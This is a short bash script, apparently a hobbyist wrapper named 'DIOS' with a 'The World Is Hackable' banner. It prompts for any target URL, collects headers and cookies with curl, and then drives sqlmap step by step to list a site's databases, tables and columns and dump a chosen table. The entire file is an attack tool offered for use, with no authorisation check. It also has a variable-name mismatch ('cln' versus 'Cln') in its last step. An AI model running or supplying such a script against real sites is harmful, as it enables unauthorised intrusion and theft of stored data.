R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
C='\033[1;36m'
W='\033[0m'
sql='python3 sqlmap.py'
cd sqlmap
clear
printf "$R"
   figlet "                          DIOS"
   printf "$M"
   echo "                      ♥  The World Is Hackable  ♥"
sleep 5.0

printf "$Y"
echo "Set Your Url"
read -p "=> " Url
printf "$C"
curl -G  --dump-header header.txt  $Url
curl -c cookies.txt $Url
clear
echo
echo
printf "$G"
echo "If the database is not exploitable press ctrl + c"
sleep 2.5
$sql -u $Url --dbs
echo "                           Set The Database Name"
read -p "=>" dbs
$sql -u $Url -D $dbs --tables
echo "                           Set The Table Name"
read -p "=>" tbl
$sql -u $Url -D $dbs -T $tbl --columns
echo "                           Set The Column Name"
read -p "=>" cln
$sql -u $Url -D $dbs -T $tbl -C $Cln --dump
